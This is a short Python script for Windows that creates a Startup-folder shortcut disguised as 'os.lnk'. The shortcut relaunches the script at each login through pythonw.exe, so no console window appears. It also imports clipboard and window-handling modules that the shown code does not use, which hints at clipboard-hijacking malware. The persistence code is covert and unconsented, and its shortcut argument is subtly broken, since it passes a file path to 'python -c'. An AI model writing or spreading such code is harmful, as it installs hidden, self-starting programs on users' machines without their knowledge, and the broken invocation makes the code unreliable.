import time
import re
import pyperclip
import win32gui
import win32con
import winreg as reg
import os
import sys
from win32com.client import Dispatch

def add_to_startup():
    # Get the startup folder path using environment variables
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    path = os.path.join(startup_folder, "os.lnk")
    target = sys.executable.replace("python.exe", "pythonw.exe")
    wDir = os.path.dirname(os.path.abspath(__file__))
    icon = sys.executable

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.Arguments = f'-c "{os.path.abspath(__file__)}"'
    shortcut.save()

add_to_startup()
print(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
